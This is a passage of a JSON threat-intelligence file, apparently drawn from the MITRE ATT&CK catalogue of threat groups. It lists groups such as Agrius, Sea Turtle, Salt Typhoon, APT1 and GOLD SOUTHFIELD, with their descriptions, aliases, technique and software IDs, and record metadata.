      "created": "2017-05-31T21:32:09.849000+00:00",
      "modified": "2024-09-23T20:34:43.022000+00:00"
    },
    "G1030": {
      "id": "G1030",
      "name": "Agrius",
      "description": "[Agrius](https://attack.mitre.org/groups/G1030) is an Iranian threat actor active since 2020 notable for a series of ransomware and wiper operations in the Middle East, with an emphasis on Israeli targets.(Citation: SentinelOne Agrius 2021)(Citation: CheckPoint Agrius 2023) Public reporting has linked [Agrius](https://attack.mitre.org/groups/G1030) to Iran's Ministry of Intelligence and Security (MOIS).(Citation: Microsoft Iran Cyber 2023)",
      "aliases": [
        "Agrius",
        "Pink Sandstorm",
        "AMERICIUM",
        "Agonizing Serpens",
        "BlackShadow"
      ],
      "techniques": [
        "T1018",
        "T1046",
        "T1078.002",
        "T1562.001",
        "T1140",
        "T1505.003",
        "T1005",
        "T1583",
        "T1074.001",
        "T1110.003",
        "T1119",
        "T1003.002",
        "T1560.001",
        "T1036",
        "T1003.001",
        "T1021.001",
        "T1190",
        "T1110",
        "T1059.003",
        "T1543.003",
        "T1041",
        "T1570"
      ],
      "software": [
        "S0590",
        "S0002",
        "S1132",
        "S1137",
        "S1135",
        "S1134",
        "S1136",
        "S0073",
        "S1133"
      ],
      "url": "https://attack.mitre.org/groups/G1030",
      "stix_id": "intrusion-set--b8137919-38cb-4db0-90f3-437be885faba",
      "created": "2024-05-21T19:13:23.526000+00:00",
      "modified": "2024-08-29T15:18:44.308000+00:00"
    },
    "G1041": {
      "id": "G1041",
      "name": "Sea Turtle",
      "description": "[Sea Turtle](https://attack.mitre.org/groups/G1041) is a T\u00fcrkiye-linked threat actor active since at least 2017 performing espionage and service provider compromise operations against victims in Asia, Europe, and North America. [Sea Turtle](https://attack.mitre.org/groups/G1041) is notable for targeting registrars managing ccTLDs and complex DNS-based intrusions where the threat actor compromised DNS providers to hijack DNS resolution for ultimate victims, enabling [Sea Turtle](https://attack.mitre.org/groups/G1041) to spoof log in portals and other applications for credential collection.(Citation: Talos Sea Turtle 2019)(Citation: Talos Sea Turtle 2019_2)(Citation: PWC Sea Turtle 2023)(Citation: Hunt Sea Turtle 2024)",
      "aliases": [
        "Sea Turtle",
        "Teal Kurma",
        "Marbled Dust",
        "Cosmic Wolf",
        "SILICON"
      ],
      "techniques": [
        "T1583",
        "T1074.002",
        "T1070.002",
        "T1562.003",
        "T1114.001",
        "T1583.002",
        "T1608.003",
        "T1584.002",
        "T1583.003",
        "T1588.004",
        "T1560.001",
        "T1564.011",
        "T1588.002",
        "T1190",
        "T1078.003",
        "T1203",
        "T1566",
        "T1133",
        "T1213",
        "T1583.001",
        "T1027.004",
        "T1059.004",
        "T1505.003",
        "T1078",
        "T1071.001",
        "T1199",
        "T1557"
      ],
      "software": [
        "S1163"
      ],
      "url": "https://attack.mitre.org/groups/G1041",
      "stix_id": "intrusion-set--56a05d27-4d47-418a-b330-781c5614f202",
      "created": "2024-11-20T18:21:28.242000+00:00",
      "modified": "2025-03-28T15:28:31.727000+00:00"
    },
    "G0075": {
      "id": "G0075",
      "name": "Rancor",
      "description": "[Rancor](https://attack.mitre.org/groups/G0075) is a threat group that has led targeted campaigns against the South East Asia region. [Rancor](https://attack.mitre.org/groups/G0075) uses politically-motivated lures to entice victims to open malicious documents. (Citation: Rancor Unit42 June 2018)",
      "aliases": [
        "Rancor"
      ],
      "techniques": [
        "T1071.001",
        "T1059.005",
        "T1204.002",
        "T1053.005",
        "T1105",
        "T1218.007",
        "T1546.003",
        "T1059.003",
        "T1566.001"
      ],
      "software": [
        "S0075",
        "S0160",
        "S0255",
        "S0254"
      ],
      "url": "https://attack.mitre.org/groups/G0075",
      "stix_id": "intrusion-set--f40eb8ce-2a74-4e56-89a1-227021410142",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-02-09T19:30:38.407000+00:00"
    },
    "G1036": {
      "id": "G1036",
      "name": "Moonstone Sleet",
      "description": "[Moonstone Sleet](https://attack.mitre.org/groups/G1036) is a North Korean-linked threat actor executing both financially motivated attacks and espionage operations. The group previously overlapped significantly with another North Korean-linked entity, [Lazarus Group](https://attack.mitre.org/groups/G0032), but has differentiated its tradecraft since 2023. [Moonstone Sleet](https://attack.mitre.org/groups/G1036) is notable for creating fake companies and personas to interact with victim entities, as well as developing unique malware such as a variant delivered via a fully functioning game.(Citation: Microsoft Moonstone Sleet 2024)",
      "aliases": [
        "Moonstone Sleet",
        "Storm-1789"
      ],
      "techniques": [
        "T1587.001",
        "T1033",
        "T1071.001",
        "T1585.002",
        "T1589.002",
        "T1140",
        "T1591",
        "T1053.005",
        "T1547.001",
        "T1204.002",
        "T1566.001",
        "T1027",
        "T1583.003",
        "T1105",
        "T1016",
        "T1598.003",
        "T1003.001",
        "T1608.001",
        "T1598",
        "T1195.002",
        "T1569.002",
        "T1583.001",
        "T1217",
        "T1566.003",
        "T1486",
        "T1585.001",
        "T1587",
        "T1082",
        "T1027.013",
        "T1027.009"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G1036",
      "stix_id": "intrusion-set--e6db1e55-b199-4b6b-8633-989345ee45e0",
      "created": "2024-08-26T17:39:06.020000+00:00",
      "modified": "2024-10-01T11:51:31.065000+00:00"
    },
    "G0127": {
      "id": "G0127",
      "name": "TA551",
      "description": "[TA551](https://attack.mitre.org/groups/G0127) is a financially-motivated threat group that has been active since at least 2018. (Citation: Secureworks GOLD CABIN) The group has primarily targeted English, German, Italian, and Japanese speakers through email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021)",
      "aliases": [
        "TA551",
        "GOLD CABIN",
        "Shathak"
      ],
      "techniques": [
        "T1218.010",
        "T1589.002",
        "T1204.002",
        "T1218.011",
        "T1027.003",
        "T1566.001",
        "T1132.001",
        "T1568.002",
        "T1027.010",
        "T1071.001",
        "T1105",
        "T1218.005",
        "T1059.003",
        "T1036"
      ],
      "software": [
        "S0633",
        "S0650",
        "S0483",
        "S0476",
        "S0386"
      ],
      "url": "https://attack.mitre.org/groups/G0127",
      "stix_id": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
      "created": "2021-03-19T21:04:00.692000+00:00",
      "modified": "2025-04-16T20:37:36.634000+00:00"
    },
    "G1045": {
      "id": "G1045",
      "name": "Salt Typhoon",
      "description": "[Salt Typhoon](https://attack.mitre.org/groups/G1045) is a People's Republic of China (PRC) state-backed actor that has been active since at least 2019 and responsible for numerous compromises of network infrastructure at major U.S. telecommunication and internet service providers (ISP).(Citation: US Dept. of Treasury Salt Typhoon JAN 2025)(Citation: Cisco Salt Typhoon FEB 2025)\n",
      "aliases": [
        "Salt Typhoon"
      ],
      "techniques": [
        "T1590.004",
        "T1562.004",
        "T1572",
        "T1587.001",
        "T1048.003",
        "T1098.004",
        "T1040",
        "T1602.002",
        "T1110.002",
        "T1070.002",
        "T1021.004",
        "T1588.002",
        "T1136",
        "T1190"
      ],
      "software": [
        "S1206"
      ],
      "url": "https://attack.mitre.org/groups/G1045",
      "stix_id": "intrusion-set--1c3dcf91-b859-4aae-a09c-ae26dc8b6390",
      "created": "2025-02-24T20:45:14.093000+00:00",
      "modified": "2025-03-06T20:09:16.402000+00:00"
    },
    "G0001": {
      "id": "G0001",
      "name": "Axiom",
      "description": "[Axiom](https://attack.mitre.org/groups/G0001) is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of overlap between [Axiom](https://attack.mitre.org/groups/G0001) and [Winnti Group](https://attack.mitre.org/groups/G0044) but the two groups appear to be distinct based on differences in reporting on TTPs and targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015)",
      "aliases": [
        "Axiom",
        "Group 72"
      ],
      "techniques": [
        "T1001.002",
        "T1005",
        "T1560",
        "T1584.005",
        "T1189",
        "T1553",
        "T1021.001",
        "T1583.002",
        "T1203",
        "T1078",
        "T1583.003",
        "T1563.002",
        "T1546.008",
        "T1566",
        "T1190",
        "T1003"
      ],
      "software": [
        "S0412",
        "S0032",
        "S0672",
        "S0013",
        "S0009",
        "S0012",
        "S0021",
        "S0203"
      ],
      "url": "https://attack.mitre.org/groups/G0001",
      "stix_id": "intrusion-set--a0cb9370-e39b-44d5-9f50-ef78e412b973",
      "created": "2017-05-31T21:31:45.629000+00:00",
      "modified": "2025-04-16T20:37:36.790000+00:00"
    },
    "G0070": {
      "id": "G0070",
      "name": "Dark Caracal",
      "description": "[Dark Caracal](https://attack.mitre.org/groups/G0070) is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. (Citation: Lookout Dark Caracal Jan 2018)",
      "aliases": [
        "Dark Caracal"
      ],
      "techniques": [
        "T1027.013",
        "T1059.003",
        "T1071.001",
        "T1204.002",
        "T1027.002",
        "T1218.001",
        "T1189",
        "T1547.001",
        "T1083",
        "T1566.003",
        "T1005",
        "T1113"
      ],
      "software": [
        "S0182",
        "S0235",
        "S0234"
      ],
      "url": "https://attack.mitre.org/groups/G0070",
      "stix_id": "intrusion-set--8a831aaa-f3e0-47a3-bed8-a9ced744dd12",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-11T02:42:07.325000+00:00"
    },
    "G0133": {
      "id": "G0133",
      "name": "Nomadic Octopus",
      "description": "\n[Nomadic Octopus](https://attack.mitre.org/groups/G0133) is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. [Nomadic Octopus](https://attack.mitre.org/groups/G0133) has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants.(Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018)",
      "aliases": [
        "Nomadic Octopus",
        "DustSquad"
      ],
      "techniques": [
        "T1059.003",
        "T1036",
        "T1566.001",
        "T1204.002",
        "T1105",
        "T1564.003",
        "T1059.001"
      ],
      "software": [
        "S0340"
      ],
      "url": "https://attack.mitre.org/groups/G0133",
      "stix_id": "intrusion-set--fed4f0a2-4347-4530-b0f5-6dfd49b29172",
      "created": "2021-08-24T17:04:27.002000+00:00",
      "modified": "2025-04-16T20:37:36.955000+00:00"
    },
    "G0005": {
      "id": "G0005",
      "name": "APT12",
      "description": "[APT12](https://attack.mitre.org/groups/G0005) is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.(Citation: Meyers Numbered Panda)",
      "aliases": [
        "APT12",
        "IXESHE",
        "DynCalc",
        "Numbered Panda",
        "DNSCALC"
      ],
      "techniques": [
        "T1204.002",
        "T1102.002",
        "T1568.003",
        "T1203",
        "T1566.001"
      ],
      "software": [
        "S0040",
        "S0015",
        "S0003"
      ],
      "url": "https://attack.mitre.org/groups/G0005",
      "stix_id": "intrusion-set--c47f937f-1022-4f42-8525-e7a4779a14cb",
      "created": "2017-05-31T21:31:47.537000+00:00",
      "modified": "2025-04-25T14:49:18.305000+00:00"
    },
    "G0022": {
      "id": "G0022",
      "name": "APT3",
      "description": "[APT3](https://attack.mitre.org/groups/G0022) is a China-based threat group that researchers have attributed to China's Ministry of State Security.(Citation: FireEye Clandestine Wolf)(Citation: Recorded Future APT3 May 2017) This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap.(Citation: FireEye Clandestine Wolf)(Citation: FireEye Operation Double Tap) As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong.(Citation: Symantec Buckeye)",
      "aliases": [
        "APT3",
        "Gothic Panda",
        "Pirpi",
        "UPS Team",
        "Buckeye",
        "Threat Group-0110",
        "TG-0110"
      ],
      "techniques": [
        "T1053.005",
        "T1104",
        "T1110.002",
        "T1564.003",
        "T1555.003",
        "T1059.003",
        "T1016",
        "T1049",
        "T1090.002",
        "T1218.011",
        "T1027",
        "T1566.002",
        "T1098.007",
        "T1204.001",
        "T1041",
        "T1552.001",
        "T1074.001",
        "T1078.002",
        "T1005",
        "T1203",
        "T1021.002",
        "T1574.001",
        "T1087.001",
        "T1070.004",
        "T1083",
        "T1546.008",
        "T1560.001",
        "T1082",
        "T1059.001",
        "T1543.003",
        "T1003.001",
        "T1547.001",
        "T1021.001",
        "T1057",
        "T1095",
        "T1069",
        "T1018",
        "T1056.001",
        "T1036.010",
        "T1027.002",
        "T1136.001",
        "T1105",
        "T1033",
        "T1027.005"
      ],
      "software": [
        "S0111",
        "S0349",
        "S0165",
        "S0013",
        "S0063",
        "S0166"
      ],
      "url": "https://attack.mitre.org/groups/G0022",
      "stix_id": "intrusion-set--0bbdf25b-30ff-4894-a1cd-49260d0dd2d9",
      "created": "2017-05-31T21:31:55.853000+00:00",
      "modified": "2024-09-16T16:18:53.978000+00:00"
    },
    "G0024": {
      "id": "G0024",
      "name": "Putter Panda",
      "description": "[Putter Panda](https://attack.mitre.org/groups/G0024) is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA\u2019s 3rd General Staff Department (GSD). (Citation: CrowdStrike Putter Panda)",
      "aliases": [
        "Putter Panda",
        "APT2",
        "MSUpdater"
      ],
      "techniques": [
        "T1547.001",
        "T1562.001",
        "T1055.001",
        "T1027.013"
      ],
      "software": [
        "S0067",
        "S0066",
        "S0065",
        "S0068"
      ],
      "url": "https://attack.mitre.org/groups/G0024",
      "stix_id": "intrusion-set--5ce5392a-3a6c-4e07-9df3-9b6a9159ac45",
      "created": "2017-05-31T21:31:56.785000+00:00",
      "modified": "2024-11-17T16:43:16.049000+00:00"
    },
    "G1013": {
      "id": "G1013",
      "name": "Metador",
      "description": "[Metador](https://attack.mitre.org/groups/G1013) is a suspected cyber espionage group that was first reported in September 2022. [Metador](https://attack.mitre.org/groups/G1013) has targeted a limited number of telecommunication companies, internet service providers, and universities in the Middle East and Africa. Security researchers named the group [Metador](https://attack.mitre.org/groups/G1013) based on the \"I am meta\" string in one of the group's malware samples and the expectation of Spanish-language responses from C2 servers.(Citation: SentinelLabs Metador Sept 2022)",
      "aliases": [
        "Metador"
      ],
      "techniques": [
        "T1071.001",
        "T1059.003",
        "T1588.001",
        "T1546.003",
        "T1027.013",
        "T1070.004",
        "T1095",
        "T1588.002",
        "T1105"
      ],
      "software": [
        "S1059",
        "S1060"
      ],
      "url": "https://attack.mitre.org/groups/G1013",
      "stix_id": "intrusion-set--bfc5ddb3-4dfb-4278-8928-020e1b3feddd",
      "created": "2023-01-25T23:57:51.818000+00:00",
      "modified": "2024-04-11T00:46:59.526000+00:00"
    },
    "G0062": {
      "id": "G0062",
      "name": "TA459",
      "description": "[TA459](https://attack.mitre.org/groups/G0062) is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others. (Citation: Proofpoint TA459 April 2017)",
      "aliases": [
        "TA459"
      ],
      "techniques": [
        "T1566.001",
        "T1203",
        "T1059.005",
        "T1204.002",
        "T1059.001"
      ],
      "software": [
        "S0032",
        "S0033",
        "S0013",
        "S0230"
      ],
      "url": "https://attack.mitre.org/groups/G0062",
      "stix_id": "intrusion-set--62a64fd3-aaf7-4d09-a375-d6f8bb118481",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:49:19.743000+00:00"
    },
    "G0128": {
      "id": "G0128",
      "name": "ZIRCONIUM",
      "description": "[ZIRCONIUM](https://attack.mitre.org/groups/G0128) is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community.(Citation: Microsoft Targeting Elections September 2020)(Citation: Check Point APT31 February 2021)",
      "aliases": [
        "ZIRCONIUM",
        "APT31",
        "Violet Typhoon"
      ],
      "techniques": [
        "T1082",
        "T1598",
        "T1012",
        "T1665",
        "T1059.003",
        "T1583.006",
        "T1584.008",
        "T1555.003",
        "T1059.006",
        "T1547.001",
        "T1573.001",
        "T1124",
        "T1140",
        "T1598.003",
        "T1566.002",
        "T1583.001",
        "T1033",
        "T1090.003",
        "T1041",
        "T1036",
        "T1567.002",
        "T1027.002",
        "T1204.001",
        "T1036.004",
        "T1068",
        "T1218.007",
        "T1105",
        "T1016",
        "T1102.002"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G0128",
      "stix_id": "intrusion-set--4283ae19-69c7-4347-a35e-b56f08eb660b",
      "created": "2021-03-24T15:48:17.731000+00:00",
      "modified": "2025-04-04T17:09:39.718000+00:00"
    },
    "G0006": {
      "id": "G0006",
      "name": "APT1",
      "description": "[APT1](https://attack.mitre.org/groups/G0006) is a Chinese threat group that has been attributed to the 2nd Bureau of the People\u2019s Liberation Army (PLA) General Staff Department\u2019s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. (Citation: Mandiant APT1)",
      "aliases": [
        "APT1",
        "Comment Crew",
        "Comment Group",
        "Comment Panda"
      ],
      "techniques": [
        "T1003.001",
        "T1057",
        "T1005",
        "T1550.002",
        "T1583.001",
        "T1560.001",
        "T1119",
        "T1114.002",
        "T1566.002",
        "T1016",
        "T1114.001",
        "T1588.001",
        "T1049",
        "T1585.002",
        "T1584.001",
        "T1036.005",
        "T1087.001",
        "T1566.001",
        "T1135",
        "T1059.003",
        "T1588.002",
        "T1007",
        "T1021.001"
      ],
      "software": [
        "S0100",
        "S0119",
        "S0029",
        "S0121",
        "S0002",
        "S0008",
        "S0122",
        "S0057",
        "S0039",
        "S0123",
        "S0006",
        "S0345",
        "S0017",
        "S0026",
        "S0012",
        "S0109",
        "S0025"
      ],
      "url": "https://attack.mitre.org/groups/G0006",
      "stix_id": "intrusion-set--6a2e693f-24e5-451a-9f88-b36a108e5662",
      "created": "2017-05-31T21:31:47.955000+00:00",
      "modified": "2025-04-25T14:49:20.672000+00:00"
    },
    "G0019": {
      "id": "G0019",
      "name": "Naikon",
      "description": "[Naikon](https://attack.mitre.org/groups/G0019) is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People\u2019s Liberation Army\u2019s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020).(Citation: CameraShy) Active since at least 2010, [Naikon](https://attack.mitre.org/groups/G0019) has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN).(Citation: CameraShy)(Citation: Baumgartner Naikon 2015) \n\nWhile [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: Baumgartner Golovkin Naikon 2015)",
      "aliases": [
        "Naikon"
      ],
      "techniques": [
        "T1078.002",
        "T1018",
        "T1547.001",
        "T1518.001",
        "T1046",
        "T1047",
        "T1137.006",
        "T1016",
        "T1036.005",
        "T1566.001",
        "T1036.004",
        "T1053.005",
        "T1204.002",
        "T1574.001"
      ],
      "software": [
        "S0095",
        "S0039",
        "S0097",
        "S0108",
        "S0096",
        "S0029",
        "S0057",
        "S0059",
        "S0629",
        "S0630",
        "S0055",
        "S0061",
        "S0060",
        "S0058",
        "S0456"
      ],
      "url": "https://attack.mitre.org/groups/G0019",
      "stix_id": "intrusion-set--2a158b0a-7ef8-43cb-9985-bf34d1e12050",
      "created": "2017-05-31T21:31:54.232000+00:00",
      "modified": "2025-04-25T14:49:21.044000+00:00"
    },
    "G0054": {
      "id": "G0054",
      "name": "Sowbug",
      "description": "[Sowbug](https://attack.mitre.org/groups/G0054) is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. (Citation: Symantec Sowbug Nov 2017)",
      "aliases": [
        "Sowbug"
      ],
      "techniques": [
        "T1083",
        "T1039",
        "T1560.001",
        "T1059.003",
        "T1056.001",
        "T1135",
        "T1036.005",
        "T1003",
        "T1082"
      ],
      "software": [
        "S0188",
        "S0171"
      ],
      "url": "https://attack.mitre.org/groups/G0054",
      "stix_id": "intrusion-set--d1acfbb3-647b-4723-9154-800ec119006e",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:49:21.603000+00:00"
    },
    "G0103": {
      "id": "G0103",
      "name": "Mofang",
      "description": "[Mofang](https://attack.mitre.org/groups/G0103) is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.(Citation: FOX-IT May 2016 Mofang)",
      "aliases": [
        "Mofang"
      ],
      "techniques": [
        "T1566.002",
        "T1204.001",
        "T1566.001",
        "T1027.013",
        "T1204.002",
        "T1027.015"
      ],
      "software": [
        "S0445",
        "S0444"
      ],
      "url": "https://attack.mitre.org/groups/G0103",
      "stix_id": "intrusion-set--88489675-d216-4884-a98f-49a89fcc1643",
      "created": "2020-05-12T21:23:59.021000+00:00",
      "modified": "2024-04-11T00:41:37.453000+00:00"
    },
    "G0095": {
      "id": "G0095",
      "name": "Machete",
      "description": "[Machete](https://attack.mitre.org/groups/G0095) is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. [Machete](https://attack.mitre.org/groups/G0095) generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020)",
      "aliases": [
        "Machete",
        "APT-C-43",
        "El Machete"
      ],
      "techniques": [
        "T1204.002",
        "T1566.002",
        "T1059.003",
        "T1059.005",
        "T1059.006",
        "T1053.005",
        "T1036.005",
        "T1204.001",
        "T1189",
        "T1566.001",
        "T1218.007"
      ],
      "software": [
        "S0409"
      ],
      "url": "https://attack.mitre.org/groups/G0095",
      "stix_id": "intrusion-set--38863958-a201-4ce1-9dbe-539b0b6804e0",
      "created": "2019-09-13T12:37:10.394000+00:00",
      "modified": "2025-04-25T14:49:22.323000+00:00"
    },
    "G0053": {
      "id": "G0053",
      "name": "FIN5",
      "description": "[FIN5](https://attack.mitre.org/groups/G0053) is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. (Citation: FireEye Respond Webinar July 2017) (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)",
      "aliases": [
        "FIN5"
      ],
      "techniques": [
        "T1090.002",
        "T1070.004",
        "T1074.001",
        "T1059",
        "T1018",
        "T1119",
        "T1110",
        "T1588.002",
        "T1133",
        "T1070.001",
        "T1078"
      ],
      "software": [
        "S0005",
        "S0029",
        "S0006",
        "S0195",
        "S0173",
        "S0169"
      ],
      "url": "https://attack.mitre.org/groups/G0053",
      "stix_id": "intrusion-set--85403903-15e0-4f9f-9be4-a259ecad4022",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:49:23.588000+00:00"
    },
    "G1035": {
      "id": "G1035",
      "name": "Winter Vivern",
      "description": "Winter Vivern is a group linked to Russian and Belorussian interests active since at least 2020 targeting various European government and NGO entities, along with sporadic targeting of Indian and US victims. The group leverages a combination of document-based phishing activity and server-side exploitation for initial access, leveraging adversary-controlled and -created infrastructure for follow-on command and control.(Citation: DomainTools WinterVivern 2021)(Citation: SentinelOne WinterVivern 2023)(Citation: CERT-UA WinterVivern 2023)(Citation: ESET WinterVivern 2023)(Citation: Proofpoint WinterVivern 2023)",
      "aliases": [
        "Winter Vivern",
        "TA473",
        "UAC-0114"
      ],
      "techniques": [
        "T1059",
        "T1071.001",
        "T1056.003",
        "T1033",
        "T1583.003",
        "T1059.007",
        "T1566.001",
        "T1036.004",
        "T1113",
        "T1189",
        "T1119",
        "T1140",
        "T1020",
        "T1105",
        "T1190",
        "T1595.002",
        "T1041",
        "T1053.005",
        "T1584.006",
        "T1036",
        "T1583.001",
        "T1082",
        "T1059.003",
        "T1204.001",
        "T1083",
        "T1114.001",
        "T1059.001"
      ],
      "software": [],
      "url": "https://attack.mitre.org/groups/G1035",
      "stix_id": "intrusion-set--75a07184-a7e5-4222-95a1-a04dbc96a29c",
      "created": "2024-07-29T22:23:03.779000+00:00",
      "modified": "2024-10-10T14:33:40.986000+00:00"
    },
    "G1008": {
      "id": "G1008",
      "name": "SideCopy",
      "description": "[SideCopy](https://attack.mitre.org/groups/G1008) is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. [SideCopy](https://attack.mitre.org/groups/G1008)'s name comes from its infection chain that tries to mimic that of [Sidewinder](https://attack.mitre.org/groups/G0121), a suspected Indian threat group.(Citation: MalwareBytes SideCopy Dec 2021)",
      "aliases": [
        "SideCopy"
      ],
      "techniques": [
        "T1614",
        "T1518.001",
        "T1584.001",
        "T1105",
        "T1016",
        "T1608.001",
        "T1106",
        "T1059.005",
        "T1518",
        "T1566.001",
        "T1574.001",
        "T1204.002",
        "T1082",
        "T1598.002",
        "T1036.005",
        "T1218.005"
      ],
      "software": [
        "S1029",
        "S1028"
      ],
      "url": "https://attack.mitre.org/groups/G1008",
      "stix_id": "intrusion-set--03be849d-b5a2-4766-9dda-48976bae5710",
      "created": "2022-08-07T13:52:07.791000+00:00",
      "modified": "2025-04-16T20:37:38.248000+00:00"
    },
    "G0064": {
      "id": "G0064",
      "name": "APT33",
      "description": "[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors.(Citation: FireEye APT33 Sept 2017)(Citation: FireEye APT33 Webinar Sept 2017)",
      "aliases": [
        "APT33",
        "HOLMIUM",
        "Elfin",
        "Peach Sandstorm"
      ],
      "techniques": [
        "T1552.001",
        "T1003.005",
        "T1560.001",
        "T1555.003",
        "T1552.006",
        "T1027.013",
        "T1566.001",
        "T1003.001",
        "T1566.002",
        "T1110.003",
        "T1003.004",
        "T1053.005",
        "T1555",
        "T1546.003",
        "T1105",
        "T1048.003",
        "T1588.002",
        "T1040",
        "T1071.001",
        "T1059.001",
        "T1547.001",
        "T1078",
        "T1573.001",
        "T1059.005",
        "T1132.001",
        "T1571",
        "T1078.004",
        "T1203",
        "T1204.002",
        "T1204.001",
        "T1068"
      ],
      "software": [
        "S0194",
        "S0378",
        "S0358",
        "S0002",
        "S0349",
        "S0039",
        "S0192",
        "S0363",
        "S0095",
        "S0129",
        "S0336",
        "S1134",
        "S0380",
        "S0371",
        "S0199",
        "S0198"
      ],
      "url": "https://attack.mitre.org/groups/G0064",
      "stix_id": "intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-04-11T16:06:34.700000+00:00"
    },
    "G0030": {
      "id": "G0030",
      "name": "Lotus Blossom",
      "description": "[Lotus Blossom](https://attack.mitre.org/groups/G0030) is a long-standing threat group largely targeting various entities in Asia since at least 2009. In addition to government and related targets, [Lotus Blossom](https://attack.mitre.org/groups/G0030) has also targeted entities such as digital certificate issuers.(Citation: Lotus Blossom Jun 2015)(Citation: Symantec Bilbug 2022)(Citation: Cisco LotusBlossom 2025)",
      "aliases": [
        "Lotus Blossom",
        "DRAGONFISH",
        "Spring Dragon",
        "RADIUM",
        "Raspberry Typhoon",
        "Bilbug",
        "Thrip"
      ],
      "techniques": [
        "T1016",
        "T1543.003",
        "T1087.002",
        "T1074.001",
        "T1134",
        "T1087.001",
        "T1090.001",
        "T1539",
        "T1112",
        "T1049",
        "T1047",
        "T1482",
        "T1016.001",
        "T1090.003",
        "T1588.002",
        "T1018",
        "T1083",
        "T1560.003",
        "T1560.001",
        "T1046",
        "T1012"
      ],
      "software": [
        "S0552",
        "S0097",
        "S0357",
        "S0590",
        "S0160",
        "S0082",
        "S0081",
        "S1211",
        "S1210"
      ],
      "url": "https://attack.mitre.org/groups/G0030",
      "stix_id": "intrusion-set--88b7dbc2-32d3-4e31-af2f-3fc24e1582d7",
      "created": "2017-05-31T21:32:01.092000+00:00",
      "modified": "2025-04-23T21:20:58.367000+00:00"
    },
    "G0115": {
      "id": "G0115",
      "name": "GOLD SOUTHFIELD",
      "description": "[GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) is a financially motivated threat group active since at least 2018 that operates the [REvil](https://attack.mitre.org/software/S0496) Ransomware-as-a Service (RaaS). [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments. By early 2020, [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) started capitalizing on the new trend of stealing data and further extorting the victim to pay for their data to not get publicly leaked.(Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: Secureworks GOLD SOUTHFIELD)(Citation: CrowdStrike Evolution of Pinchy Spider July 2021)",
      "aliases": [
        "GOLD SOUTHFIELD",
        "Pinchy Spider"
      ],
      "techniques": [
        "T1199",
        "T1190",
        "T1113",
        "T1219",
        "T1195.002",
        "T1027.010",
        "T1133",
        "T1059.001",
        "T1566"
      ],
      "software": [
        "S0591",
        "S0496"
      ],
      "url": "https://attack.mitre.org/groups/G0115",
      "stix_id": "intrusion-set--c77c5576-ca19-42ed-a36f-4b4486a84133",
      "created": "2020-09-22T19:41:27.845000+00:00",
      "modified": "2025-04-16T20:37:38.397000+00:00"
    },
    "G0123": {
      "id": "G0123",
      "name": "Volatile Cedar",
